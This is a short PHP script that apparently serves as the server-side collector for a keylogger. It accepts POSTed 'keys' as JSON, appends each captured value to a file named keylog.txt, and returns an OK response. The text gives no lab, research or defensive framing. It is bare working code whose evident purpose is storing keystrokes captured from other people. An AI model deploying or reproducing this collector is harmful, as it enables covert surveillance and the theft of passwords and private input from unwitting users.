<?php

$file = fopen("keylog.txt","a+");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
   $keys = json_decode((string)$_POST['keys'] ?? '[]', true);

foreach ($keys as $k=>$v) {
  fwrite($file, $v . PHP_EOL);
}

fclose($file);

header('Content-Type: application/json');
echo json_encode(['message' => 'OK']);
 
}

?>
